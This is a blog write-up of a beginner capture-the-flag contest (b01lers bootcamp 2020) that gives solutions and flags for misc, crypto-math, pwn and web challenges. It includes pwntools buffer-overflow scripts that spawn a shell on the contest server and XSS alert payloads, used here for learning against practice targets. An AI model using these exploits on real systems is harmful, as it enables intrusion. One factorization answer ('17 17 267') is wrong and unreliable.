+++
title = "Writeup: b01lers CTF bootcamp 2020"
date = 2020-10-04T16:57:20-04:00
categories = ["writeup"]
tags = ["ctf", "security"]
mathjax = true
+++

Last weekend, b01lers from Purdue University had their CTF bootcamp designed for beginners from Saturday Oct 4 9AM EDT to Sunday Oct 5 8PM EDT. It was a busy weekend for `why not make team`, so I was the only one able to participate (and even then, I didn't have too much time).

As with Down Under CTF, I didn't end up finishing all the challenges (not even close!) so this will serve as a record of what I've tried (and what didn't work).

# Background Info
935 teams signed up for b01lers bootcamp CTF (513 of which submitted solutions), and a perfect score on the CTF was 6,000 points. There were six categories overall: 
* [Crypto](#crypto)
* [Crypto World](#crypto-world)
* [Misc](#misc)
* [PWN](#pwn)
* Rev - where I didn't solve any, so I'll be leaving this out
* [Web](#web)

I'll be writing about these in chronological-ish order of how I solved them, by category.

# Misc
## Troll Hunt
> We've identified a malicious troll who may be linked to a ransomware-esque virus. They've been making posts using the hashtag "#shrive". For now, just sift through the irrelevant junk and try to find another one of their accounts.

Looking on Twitter for the hashtag `#shrive`, we see there's [this account](https://twitter.com/V760DHM) that's been tweeting for the last few days about `#shrive` and malware ...
![Screenshot of Twitter search for "#shrive", the latest 3 Tweets are from a user called V760DHM. From most recent to oldest: "free malware removal #shrive" (Oct 3), "wake up from your sleep #shrive" (Oct 2), and "#shrive will deliver justice to the world" (Oct 2).](/img/b01lers-bootcamp-2020/troll_shrive.png)

Scrolling through their timeline, we see that on Oct 2 they tweeted "OH SHOOT", followed by "nothing suspicious here" half an hour later. I tried going on the Wayback Machine to check this profile, but there were no snapshots taken.

Scrolling all the way down to their first tweet, we finally get a link:

{{< tweet 1311551737380179968 >}}

Which then takes us to their [Imgur account](https://imgur.com/user/v760dhm) with the same name. Going to the trollface image and clicking "Show bad comments" will then reveal their comment, with one downvote, containing the flag.

**Flag**: flag{shu7_up_4nd_d4nc3_G5jM30}
## Granular Data
> A disgruntled ex-employee of Granular is the prime suspect behind recent killings in the nation. We've received his manifesto, which included this photo of him. Is there anything here that could help us figure out his location?

Running `exiftool` on the image provided will give us the information we need.

**Flag**: flag{h4t3d_1n_th3_n4t10n_0MTBu}  
**Tools**: [`exiftool`](https://exiftool.org/)
## Needle in a Haystack
> Can you find the needle?

The challenge provided us with a link to a ZIP file. Once downloaded and unzipped, there were 400 text files inside (i.e., not ideal for manual searching). I used `grep` to try and look for which file contained `flag{` (and really really hoped it was in plaintext).
```sh
$ grep "flag{" -R .
./haystack269.txt:Fo1gQaT1DgTzK3BO+xkuAIRHKflag{y0u_f0unD_Th3_n33d1e!}
```

Thankfully it was in plaintext - and I got the flag!

**Flag**: flag{y0u_f0unD_Th3_n33d1e!}  
**Tools**: [`grep`](https://linux.die.net/man/1/grep)

## Zima Blue
> The mysterious artist Zima has unveiled his latest piece, and once again, it features his signature shade of blue. I honestly don't get it. Is he hiding a message in his art somehow?

We were given this image:
![Centered blue rectangle standing on its short side, covering a galaxy photo.](/img/b01lers-bootcamp-2020/zimablue.png)

Since the challenge mentioned "signature shade of blue", I figured it had something to do with the RGB colour planes. Using `stegsolve`, I opened the image and walked through the layers of the image using arrow keys. I then found the flag at the bottom of the rectangle on layer "Green plane 6" (but it is also visible on other layers).

**Flag**: flag{t3ll_by_th3_p1x3ls}  
**Tools**: [`stegsolve`](http://www.caesum.com/handbook/stego.htm)  
**Fun fact**: This was my first time using `stegsolve`!

# Crypto World
This was one of my favourite areas of the CTF. You were essentially led to a page where you could embark on a text-based adventure, à là "You are in a room with a puzzle. There are three doors leading to your N/S/W". Granted the flavourtext was much more well-written than that, but you get the gist.

This area focused primarily on math problems. It was super fun to me _not_ because I actually wanted to solve any of these math problems, but because it really showed me the limits of calculators (even if they called themselves "big number" calculators).

There were 10 challenge areas, with 3 levels in each area. I solved levels in 7 challenge areas, but only managed to successfully complete 1.

## Mini B1
> What is a possible integer solution for x and y for the equation `123*x + 179*y = 1`?

I used a [linear diophantine equation calculator](https://www.math.uwaterloo.ca/~snburris/htdocs/linear.html) and it gave the answer `x = ±16, y = ±11`. 

**Flag**: mini{B1_485a3ae14ebb98e8ccc855b3}  
**Tools**: [Linear diophantine equation calculator](https://www.math.uwaterloo.ca/~snburris/htdocs/linear.html)  
**Fun fact**: This calculator is by someone from UWaterloo!
## Mini B2
> What is a possible integer solution for x and y for the equation `5419637592*x + 8765372543*y = 1`?

The bigger numbers here meant that I couldn't keep using the same calculator. No worry, I used [another LDE calculator](https://planetcalc.com/3303/) to find out the answer: `784426129 -485011369`.

**Flag**: mini{B2_4a39f17045a8063e6eb0afa2}  
**Tools**: [Planet Calc's linear diophantine equation calculator](https://planetcalc.com/3303/)
## Mini C1
> Give a possible solution for `x^2 mod 97 = 88`.

I used [dcode's modular exponent calculator](https://www.dcode.fr/modular-exponentiation) for this (since it allows you to plug in unknowns) which gave `x = 31`.

**Flag**: mini{C1_4c88b7b4c11a9ee43f33e130}  
**Tools**: [dcode's modular exponent calculator](https://www.dcode.fr/modular-exponentiation)
## Mini C2
> Give a possible solution for `x^2 mod 1359203501 = 95422207`.

Since the numbers were bigger this time, I couldn't use dcode's calculator. Instead, I turned to my old friend [Wolfram Alpha](https://wolframalpha.com), which gave me `x = 548653309`

**Flag**: mini{C2_2ce7b90aa9335b0cb0a3db6d}  
**Tools**: [Wolfram Alpha](https://wolframalpha.com)
## Mini D1
> Give a possible solution for `11^x mod 101 = 27`.

Back to our old friend [dcode and their great calculator](https://www.dcode.fr/modular-exponentiation) for solving unknowns - which gave `x = 39`.

**Flag**: mini{D1_77858210bb3c8f6f90642947}  
**Tools**: [dcode's modular exponent calculator](https://www.dcode.fr/modular-exponentiation)
## Mini F1
> How many primes are there between 1200 and 1500?

Referencing [this list of prime numbers from 1 to 1500](http://www.factors-of.com/prime-numbers-before/Prime-numbers-from-1-to_1500_), if we count how many there are we get 43.

**Flag**: mini{F1_c45a3e68b37e85ee427389c5}  
**Tools**: [List of prime numbers from 1 to 1500](http://www.factors-of.com/prime-numbers-before/Prime-numbers-from-1-to_1500_)
## Mini H1
> the base64-encoded string below corresponds to XOR-encrypted text, with key length of 1 byte. What is the integer in the message?

```python
PQEMSRoMChsMHUkABx0MDgwbSQAaSR0eDAcdEEQPAB8MSR0BBhwaCAcNRUkPAB8MSQEcBw0bDA1JCAcNSR0eDAUfDEc=
```

Using [Cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)XOR_Brute_Force(1,100,0,'Standard',false,true,false,'')), we can use "From base64", and then "XOR bruteforce". Since we know it's only 1 byte, it won't be super computationally heavy.

Our key ends up being 49, and the message is:
```sh
tHE.SECRET.INTEGER.IS.TWENTY.FIVE.THOUSAND..FIVE.HUNDRED.AND.TWELVE
```

**Flag**: mini{H1_5ed3aca835bc208203da988b}  
**Tools**: [Cyberchef](https://gchq.github.io/CyberChef)

## Mini J1
> Find positive integers x, y that solve `x^2 + 22*y^2 = 8383`.

Using Wolfram Alpha, we get `x = 45` and `y = 17`.

**Flag**: mini{J1_c9d7861b2635ebb151b71351}  
**Tools**: [Wolfram Alpha](https://wolframalpha.com)

## mini J2
> Find positive integers x,y that solve `x^2 + 608268054*y^2 = 288964812689493391976023993`.

Thankfully this is still within Wolfram Alpha's free computation time, so it spits out the answer: `x = 729485423`, `y =  689247146`.

**Flag**: mini{J2_ab5c40aa74a7c6ad5db7b041}  
**Tools**: [Wolfram Alpha](https://wolframalpha.com)
## mini I1
> Factor the number 48263.

Using Wolfram Alpha, we get `17 17 267`.

**Flag**: mini{I1_1a8ec6471c8824fff864a95c}  
**Tools**: [Wolfram Alpha](https://wolframalpha.com)

## mini I2
> Factor 8477969543906630921459041527576694.

Again using Wolfram Alpha, we get: `2 7 7 13 19 19 79 601 234490397 1655726489421517`. 

**Flag**: mini{I2_03ba7452553b74b5122c58f0}  
**Tools**: [Wolfram Alpha](https://wolframalpha.com)

## mini I3
> Factor 71142975216676910225445498956472658317166395374468624230332488059276850400024521063814543607909086075571109949.

This one was kinda fun because I actually found two calculators that were capable of factoring this number, but one of them was several times faster (seriously, one was running for around an hour).

Using [Alpertron's integer factorization calculator](https://www.alpertron.com.ar/ECM.HTM), we get:

```sh
3 
11 
31 
29515817 
1075612307646757041328543 
1810939816479001125535889581 
1209600061687323613153983466766686569317548327433
```

**Flag**: mini{I3_8bfabf5fabe9ddeec6ebce31}  
**Tools**: [Alpertron's integer factorization calculator](https://www.alpertron.com.ar/ECM.HTM)
# Crypto
## Dream Stealing
> I've managed to steal some secrets from their subconscious, can you figure out anything from this?

We're given a file called `ciphertext.txt`, which contains `N`, `p`, `e`, and `c` - which tells us this is likely an RSA problem. 
```python
N = 98570307780590287344989641660271563150943084591122129236101184963953890610515286342182643236514124325672053304374355281945455993001454145469449640602102808287018619896494144221889411960418829067000944408910977857246549239617540588105788633268030690222998939690024329717050066864773464183557939988832150357227
p = 9695477612097814143634685975895486365012211256067236988184151482923787800058653259439240377630508988251817608592320391742708529901158658812320088090921919
e = 65537
c = 75665489286663825011389014693118717144564492910496517817351278852753259053052732535663285501814281678158913989615919776491777945945627147232073116295758400365665526264438202825171012874266519752207522580833300789271016065464767771248100896706714555420620455039240658817899104768781122292162714745754316687483
```

> Step 1: Determine an `N` that is the product of two primes, `p` and `q`. 

Since we are already given `N` and one of its factors `p`, we just need to find the other factor by doing `N / p`. 
```python
q = 10166627341555233885462189686170129966199363862865327417835599922534140147190891310884780246710738772334481095318744300242272851264697786771596673112818133
```

> Step 2: Find the totient of n, or phi(n) which is (p-1)(q-1)

Multiplying `p-1` and `q-1` together we get:
```python
totient = 98570307780590287344989641660271563150943084591122129236101184963953890610515286342182643236514124325672053304374355281945455993001454145469449640602102788424913666243446115125013749894802497855425825476346571837495143781689593338561218309247406348975238353391320418652358081883392298327112356072070946617176
```

Since we are given `e`, the public exponent, we don't have to pick one. Instead, we can move to step 4.

> Step 4: Calculate `d`, such that `de ≡ 1 mod phi(n)`. 

We can use a [modular multiplicative inverse calculator](https://www.boxentriq.com/code-breaking/modular-multiplicative-inverse) for this, which gives:
```python
d = 71019292355336569848224146505887711375625700158814041234714159220180032054227708100638146863374283786775541831015345256239719342257589808732806545609208410007110462888891498086394315520739111436827319730344824688262862111900161860529504971914388519344214410314551457166878195041761156822984243120178189851785
```

Now that we have all the elements of RSA set up, we can work on decrypting the given ciphertext `c`. 

> Step 5: Determine the original message `m = c^d mod n`.

Using a [modular exponentiation calculator](https://www.boxentriq.com/code-breaking/modular-exponentiation), we get: 
```python
message = 46327402297734345668136112664627609061622411859278517910287191659094499226493
```

Of course, that's not the final message. We then [convert this number to hexadecimal](https://www.rapidtables.com/convert/number/decimal-to-hex.html), and then [convert that hexadecimal number to ASCII](https://www.rapidtables.com/convert/number/hex-to-ascii.html), which will give us the flag.

**Flag**: flag{4cce551ng_th3_subc0nsc10us}  
**Tools**: Boxentriq's [big number](https://www.boxentriq.com/code-breaking/big-number-calculator), [modular multiplicative inverse](https://www.boxentriq.com/code-breaking/modular-multiplicative-inverse), and [modular exponentation](https://www.boxentriq.com/code-breaking/modular-exponentiation) calculators; RapidTables's [Decimal to Hex](https://www.rapidtables.com/convert/number/decimal-to-hex.html) and [Hex to ASCII](https://www.rapidtables.com/convert/number/hex-to-ascii.html) converters  
**Further Reading**: [RSA algorithm](https://simple.wikipedia.org/wiki/RSA_algorithm) (Simple English wikipedia)  
**Fun fact**: This was my first time solving an RSA challenge in a CTF!

## Clear the Mind
> They've gotten into your mind, but haven't managed to dive that deep yet. Root them out before it becomes an issue.

Inside this file, we are only given `n`, `c`, and `e`, again pointing to RSA.
```python
n = 102346477809188164149666237875831487276093753138581452189150581288274762371458335130208782251999067431416740623801548745068435494069196452555130488551392351521104832433338347876647247145940791496418976816678614449219476252610877509106424219285651012126290668046420434492850711642394317803367090778362049205437
c = 4458558515804625757984145622008292910146092770232527464448604606202639682157127059968851563875246010604577447368616002300477986613082254856311395681221546841526780960776842385163089662821
e = 3
```

Since `e = 3`, it is quite small (compared to say, 65537). If the original message was short enough (i.e. `m^3 < N`), then we can just take the cube root of the ciphertext `c`.

Using a [cube root calculator](https://www.dcode.fr/cube-root), we get: 
```python
m = 164587995846552213349276905669580061809447554828318448024777341
```

Just like the previous challenge, we then [convert this number to hexadecimal](https://www.rapidtables.com/convert/number/decimal-to-hex.html), and then [convert that hexadecimal number to ASCII](https://www.rapidtables.com/convert/number/hex-to-ascii.html), which will give us the flag.

**Flag**: flag{w3_need_7o_g0_d3ep3r}  
**Tools**: Dcode's [cube root calculator](https://www.dcode.fr/cube-root); RapidTables's [Decimal to Hex](https://www.rapidtables.com/convert/number/decimal-to-hex.html) and [Hex to ASCII](https://www.rapidtables.com/convert/number/hex-to-ascii.html)  
**Further reading**: [An attack on RSA with exponent 3](https://www.johndcook.com/blog/2019/03/06/rsa-exponent-3/)

# PWN
## The Oracle
> Would you still have broken it if I hadn't said anything?

We are given a binary executable and a C file as well. Looking inside our given C file:
```c
void win() {
    char* argv[] = { NULL };
    char* envp[] = { NULL };

    execve("/bin/sh", argv, envp);
}

int main() {
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);

    char buffer[16];

    printf("Know Thyself.\n");
    fgets(buffer, 128, stdin);
}
```

It looks like we have a buffer overflow-type situation. We want to overflow the `buffer[]` array, which is 16 bytes long, and then we also want to call the `win()` function, which will help us get a shell (by running `execve('/bin/sh')`).

After some trial and error, I discovered that I could get the executable to hang when I entered in 24 bytes. So, I used `pwntools` to write my exploit, having learned from Down Under CTF:
```python
from pwn import *

elf = ELF("./theoracle") # reference file

p = remote("chal.ctf.b01lers.com", 1015)
payload = b"A"*24 + p64(elf.sym["win"]) + b'\n'

p.recvline()
p.sendline(payload)

p.clean()
p.interactive()
```

Which actually worked! I got a shell, and was able to then print out the flag by running `cat flag.txt`. I'm so glad I learned about this from DUCTF - here's a screenshot of my victory:

![Screenshot of terminal: running script `oracle.py`. Some information about the binary: Arch: amd64-64-little, RELRO: Partial RELRO, Stack: no canary found, NX: NX enabled, PIE: No PIE (0x400000). It then opens a connection to chal.ctf.b01lers.com on port 1015 and then switches to interactive mode. Running `ls` lists out a Makefile, flag.txt, the binary `theoracle`, a C file `theoracle.c`, and a shell file `wrapper.sh`. Running `cat flag.txt` then prints out the flag.](/img/b01lers-bootcamp-2020/pwn_yessss.png)

**Flag**: flag{Be1ng_th3_1_is_JusT_l1ke_b3ing_in_l0v3}  
**Tools**: [`pwntools`](http://docs.pwntools.com/en/stable/)

## Metacortex
> This company is one of the top software companies in the world, because every single employee knows that they are part of a whole. Thus, if an employee has a problem, the company has a problem.

For this challenge, we were only given a binary executable. After some experimentation with it, I found that I could get to a shell by entering in 105 characters. So I used a similar script to the previous challenge, but substituting in 105 instead of 24:
```python
from pwn import *

elf = ELF("./metacortex")

p = remote("chal.ctf.b01lers.com", 1014)
payload = b"A"*105

p.recvline()
p.sendline(payload)

p.clean()
p.interactive()
```

And once again, once we get an interactive shell, we can simply run `ls` and then `cat flag.txt` to get the flag.

**Flag**: flag{Ne0_y0uAre_d0ing_well}  
**Tools**: [`pwntools`](http://docs.pwntools.com/en/stable/)
# Web
## Programs Only
> You don't have to be lonely at Programs Only dot com

Navigating to the site given, we see a grid of futuristic looking pictures that link to different pages, along with a Welcome panel at the top that states what my current browser is. If we dig through the source code, we can see that one picture from the grid is missing, and it leads to a page `/program`.

If we navigate to this page, we're told that users are not allowed here:
![Black background with a bright blue thin border around all text. Bright blue rounded element says "Unauthorized". Under, in smaller text: "Users do not have access to this resource". ](/img/b01lers-bootcamp-2020/programs_unauth.png)

Well, that's fine. If I'm not allowed as a user, I'll just pretend to be a program.

Using the Chrome Inspector (Ctrl+Shift+I), we can change our "user agent" to "Program" by:
1. Click 3 dots menu on top right corner
2. Under "More Tools" select "Network Conditions"
3. In the Network Conditions tab uncheck "Select automatically" for User agent
4. For the dropdown select "Custom" and then enter in "Program"

Refreshing the page will show us this new text:
![Black background with a bright blue thin border around. Bright blue rounded element says "Programs Only". Under, in smaller text: "Your user got you down, no need to worry! Programs Only is the newest, lowest latency way to find other down to ground singles! This service is open to all programs, logical, functional, and recursive! Register now and you could be next to jump start your next electric relationship!". ](/img/b01lers-bootcamp-2020/programs_only.png)

Unfortunately, this is where I hit a dead end. I tried resetting my user-agent to `logical` and variations of `logical_program`, or navigating to `/register`, all to no avail.

*Post-CTF*: This is the only challenge I didn't solve that I left in my writeup. Turns out what I needed to do was navigate to `/robots.txt`, where I would've found:
```sh
User-agent: *
Disallow: /

User-agent: Program
Allow: /program/

User-agent: Master Control Program 0000
Allow: /program/control
```

Turns out I needed to set my user-agent to `Master Control Program 0000` for `/program/control`, where I would've found the flag.

**Flag**: flag{who_programmed_you?}  
**Tools**: Chrome Dev Tools
## Reindeer Flotilla
> It's time to enter the Grid. Figure out a way to pop an alert() to get your flag.

Navigating to the given site, we're given a single input box. Once you press `Enter`, it'll pretty much echo what you type in.

Naturally the first thing I tried once I realised that was:
```html
<script>alert();</script>
```

Which didn't actually set off an alert, but it also didn't print anything - which is also good news. I looked on the [OWASP page about cross-site scripting (XSS)](https://owasp.org/www-community/attacks/xss/) for other ways to set off an alert, and decided on trying to use an attribute like `onmouseover`:
```html 
here is some <b onmouseover="alert('HELP!')">other text</b>
```

Which actually worked! Once I exited the alert by pressing the alert, the flag popped up: 
![Blue text on a black background: here is *some text* (bolded), here is some *other text* (bolded). Following by the outline of an input box. Under that, the flag.](/img/b01lers-bootcamp-2020/reindeer_flotilla.png)

**Flag**: flag{y0u_sh0uldnt_h4v3_c0m3_b4ck_flynn}  
**Further reading**: [Cross-site scripting](https://owasp.org/www-community/attacks/xss/)

## First Day Inspection
> It's your first day working at ENCOM, but they're asking you to figure things out yourself. What an onboarding process... take a look around and see what you can find.

If we go on the site provided, it's called and look around in the inspector, we can follow a trail of breadcrumbs to assemble the flag: 
1. `(1/5): flag{` in source code
2. `(2/5): w3lc` in console
3. `(3/5): 0m3_` in styles.css
4. `(4/5): t0_E` in script.js
5. ???????

I actually didn't know where to find the last one, but looking back at the challenge name (and the site itself, really), it was easily guessable as `NC0M}` to finish off the flag.

*Post-CTF*: Turns out the last part was a key in local storage (Application > Storage > Local Storage).

**Flag**: flag{w3lc0m3_t0_ENC0M}  
**Tools**: Chrome Dev Tools

# Conclusion

Overall, I placed ~166th/935 or ~166th/513 (if you take out everyone who didn't solve a challenge). Out of a perfect score of 6000 points, I got 1145 (~19%). I finished all but one challenges in the Misc category, and none of the challenge in the Rev category (whoops). 

I had a really good time with b01lers - it felt like a safe place for me to kind of experiment with techniques I'd heard of/seen before but never really had a chance to try out (like `stegsolve`, RSA, `pwntools`). I might've preferred flavourtext that was a little bit more fun, but I think on the learning side I learned a *lot*.

Looking forward to b01lers 2021 in March 😊
